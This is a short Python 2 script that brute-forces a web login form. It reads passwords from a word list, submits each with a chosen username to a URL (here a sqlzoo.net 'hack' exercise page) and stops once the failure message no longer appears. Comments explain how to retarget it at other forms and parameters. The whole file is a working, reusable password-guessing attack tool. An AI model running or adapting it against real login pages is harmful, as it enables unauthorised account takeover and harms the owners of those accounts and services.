import requests

usn = raw_input("Username / Email / Whatever: ")
#change file if another password file
psf = open("psw.txt", "r").readlines()
#change url for url param
url = "https://sqlzoo.net/hack/passwd.pl"

for j in psf:
 jb=j.strip()
 #change username:name password:name and other param:name
 #change post or get if get or post
 http = requests.get(url, data={"password":jb,"name":usn})
 con = http.content
 #change if value to content of missed login
 if "Incorrect user name or password. Try again." not in con:
  print "[**++**] correct pass: "+jb
  break;
 else:
  print "[XXX] invalid password: "+jb
